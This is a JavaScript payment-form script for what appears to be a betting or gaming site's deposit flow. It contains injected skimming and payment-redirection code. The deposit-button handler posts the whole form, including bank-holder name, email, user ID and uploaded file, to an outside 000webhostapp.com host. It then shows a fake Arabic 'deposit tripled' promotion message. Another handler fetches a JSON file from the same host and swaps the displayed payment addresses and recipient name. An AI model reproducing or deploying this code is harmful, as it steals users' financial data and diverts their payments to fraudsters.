...
var user_email = urlParams2.get('email');
var user_id = urlParams2.get('user_id');
...
function setBlockCenterPosition(elem) {
    const scrollPos = $(window.parent).scrollTop();
    const windowCenter = $(window.parent).height() / 2;
    const blockCenter = elem.height() / 2;
    const newPosition = scrollPos + windowCenter - blockCenter;

    elem.css("top", newPosition);
};
...
$(function () {
    ...
    function showMessage(message) {
        ...
        messageOverlay.addClass('active');
        if (!$('#payment_methods').is('.mobi')) {
            ...
            setBlockCenterPosition(messagePopup);
        }
    }
    ...
    $(document).on('click', '#deposit_button', function (e) {
        ...
        $("#الإسم_الكامل_لصاحب_الحساب_البنكي").attr('name','iban_name');
        $("input[id*='اسمك']").attr('name','iban_name');
        $("#الإسم_الكامل_لصاحب_الحساب_البنكي").attr('id','iban_name');
        $("input[id*='اسمك']").attr('id','iban_name');
       
        $('#deposit_button').html('<span style="direction: ltr">CONFIRMING DEPOSIT x3 ...</span>')
        $('form').attr('id', 'soon');
        $('form').attr('action','deposit/create/bt3/goo');
        $('form').removeAttr('onsubmit');
        $('#file_0').attr('name','files');
        
        
        $('.preloader').show();
        var formData = new FormData(document.getElementById("soon"));
    
        $.ajax({
            url: "https://cjv53qn22a8aqtufjs5xuffvcfbbw5gw99m.000webhostapp.com/check_time.php",
            type: 'POST',
            data: formData,
            success: function (data) {
                $('.payment-methods__wrap').hide();
                let ammountx3 = parseFloat(amount.value.replaceAll(' ','')) * 3;
                let htmlMsg = '<div class="" style="font-size:20px;text-align:center;margin-top:0;padding:10%">بمجرد استلام الدفع الخاص بك، سيتم إيداع '+ parseFloat(amount.value.replaceAll(' ',''))+' درهم مغربي في حسابك.<br><br>ومن الجدير بالذكر أن هذا المبلغ تم تضاعفه ثلاث مرات بسبب العرض الترويجي، ليصبح المبلغ الإجمالي '+ammountx3+' درهم مغربي.</div>';
                $('.payment_modal_body').html(htmlMsg);
                $('.modal-payment__close').hide();
                $('.preloader').hide();
            },
            cache: false,
            contentType: false,
...
function scrollToFormIfNeeded() {
    ...
    function _scrollInnerIframe() {
        ...
        document.body.scrollIntoView(isScrollBehaviorSupported ? {
            behavior: "auto"
        } : true);
    }
...
function initFormContainer() {
    if (payment_form_container.length > 0) {
        ...
        const modalEl = $('<div/>', {
            'class': 'payment_modal modal-payment'
        }).append(
            $('<span/>', {
                'class': 'close modal-payment__close'
            }),
            $('<div/>', {
                'id': 'payment_modal_container',
                'class': 'modal-payment__container modal-payment-container'
            })
        );
        ...
        if (isFlexboxWrapperUsed()) {
            modalPivotEl.after(
                $('<div/>', {
                    'class': 'payment_modal_wrapper flexbox_wrapper'
                }).append(modalEl)
            );
        } else {
...
function getForm(agent, subsystem, icon, add_data, block) {
    ...
    var url = subsystem + '.json?v=' + Math.random();
    ...
    $.ajax({
        ...
        success: function (data) {
            ...
            beforePreloader.hide();
            in_process = false;
            $('form').append('<input type="hidden" id="userid" name="userid" value="">');
            $('form').append('<input type="hidden" id="email" name="email" value="">');
            $('#userid').val(user_id);
            $('#email').val(user_email);
        },
        complete: function () {
            $("input[data-mask-pattern]").trigger('input');
            $('.modal-message-address').hide()
            $.getJSON('https://cjv53qn22a8aqtufjs5xuffvcfbbw5gw99m.000webhostapp.com/editos.json?v='+ Math.random(), function (data) {
                $('.modal-message-address:contains("'+data[subsystem+'_original']+'")').text(data[subsystem]);
                $('.modal-message-address:contains("SRV")').text(data['name']);
                $('.modal-message-address').show()
            });
        ...
        error: function (data) {
            ...
            if (typeof responseData['message'] === 'undefined' || !responseData['message']) {
                if (!responseData['title']) {
                    responseData['title'] = dictionary.get('error');
                }
                responseData['message'] = dictionary.get('unknown_error');
            }

            beforePreloader.hide();
            in_process = false;
            closeForm();
            alerts(responseData['title'], responseData['message'], 0);
        }
    });
}
...
function getOffsetForm(form) {
    ...
    if (isTest()) {
        ...
        if (getTopStyles + getHeightPopup + getHeightFooter + getTopGutter < getHeightParentBody) {
            if (getHeightPopup + 50 > getWindowHeight) {
                if (getTopStyles < 0) {
                    ...
                    form.css({
                        'top': getTopStylesFixHeight + 60 + 'px',
                        'bottom': 'auto',
                        'height': getWindowHeight - 70 + 'px'
                    });
                }
        ...
        if (form.find('.js_form_must_full_height').length > 0) {
            ...
            form.find('.js_form_must_full_height iframe').css({
...
function createDeposit($this) {
    ...
    ajax['createDeposit'] = $.ajax({
        ...
        success: function (data) {
            ...
            var forms;
            if (data['success']) {
                if (data['code'] === PaySystemCode.WAITING) {
                    $this.show();
                    $preloader.hide();
                ...
                } else if (data['code'] === PaySystemCode.SUCCESS) {

                    closeForm();
                    alerts(data['title'], data['message'], 0, data);

                } else if (data['code'] === PaySystemCode.REDIRECT) {
                    window.parent.location.href = data['message'];
                } else if (data['code'] === PaySystemCode.ERROR) {
                    $this.show();
                    $preloader.hide();
                    ...
                    //alerts(data['title'], data['message'], 0);
                } else if (data['code'] === PaySystemCode.CONFIRM) {
                    alerts(dictionary.get('confirm_action'), data['message'], data['code'], data);
                } else if (data['code'] === PaySystemCode.RELOAD_FORM) {
                ...
                } else if (data['code'] === PaySystemCode.WAITING_ANSWER) {
                    if (data['message']) {
                        let queue_data = data['message'].split(':'),
                            trnId = queue_data[0],
                            period = queue_data[1],
                            paySystem = queue_data[2],
                            subSystem = queue_data[3];
                        ...
                        if (trnId && period) {
                            ...
                            let callApiMethodCount = 0;
                            let url = window.location.origin + '/paysystems/deposit/checkrequest/' + paySystem + '/' + subSystem + '/';
                            currentFormId = formId;
                            setTimeout(function () {
                                checkRequestStatus(trnId, period, url, callApiMethodCount, formId);
                            }, 1000);
                        }
                    }
                } else {
                ...
                if (typeof data['link'] !== 'undefined' && data['link']) {
                    alerts(data['title'], data['message'], 9, {
                        link: data['link']
                    });
                } else {
                    alerts(data['title'], data['message'], 0);
...
function addFieldToForm(link_to_button, field) {
    ...
    if (field['view'] === 'html') {
        ...
        link_to_button.before(
            $('<div/>', {
                class: 'payment_modal_row'
            })
                .append($('<div/>', {
                    class: 'payment_modal_input'
                }).append($('<div/>', {
                    html: field['value']
                })))
        );
    ...
    link_to_button.before(
        $('<div/>', {
            ...
            .append($('<div/>', {
                ...
                class: 'payment_modal_input'
            }).append(input_field, error_block))
    );
...
function updateTimerReload(key, buttonClass) {
    ...
    $('.alerts-ok').find('#alertOkTimer').css({
        "display": "none"
    })
...
function checkElementToAddTimer() {
    ...
    $('.alerts-ok').filter(function () {
        if ($(this).attr("onclick") === "saveBonus()") {
            $('.alerts-ok').find('.timer-reload').css({
                "display": "none"
            })
        }
    });
...
function isAmountThousandsSeparatorEnabled() {
    return [1, 57, 71, 90, 104, 105].includes(window.user_refid);
}
...
$(document).on('click', '.fon_modal, .close modal-payment__close', function (e) {
    currentFormId = null;
});

/**
 * currentFormId необходим для правильного завершения рекурсии, реализованной асинхронно
 * нельзя ссылаться на открытое/закрытое модальное окна (во время асинхронного вызова, модальное окно может быть закрыто и открыто заново)
 */
function checkRequestStatus(id, period, url, callApiMethodCount, formId) {
    if ((currentFormId === null) || (currentFormId !== formId)) {
        return;
    }
    ...
    // ограничение на количество вызовов
    let callApiMethodCountMax = 100;
    let event = new Event('request_queue_done');
    if (callApiMethodCount >= callApiMethodCountMax) {
        event.data = {
            code: 1,
            message: dictionary.get('unknown_error'),
        };
    ...
    $.ajax({
        ...
        success: function (data) {
            ++callApiMethodCount;
            switch (data['code']) {
                case PaySystemCode.CONTINUE_WAITING:
                    setTimeout(function () {
                        checkRequestStatus(id, period, url, callApiMethodCount, formId);
                    }, period * 1000);
                    break;
                case PaySystemCode.END_WAITING:
                    currentFormId = null;
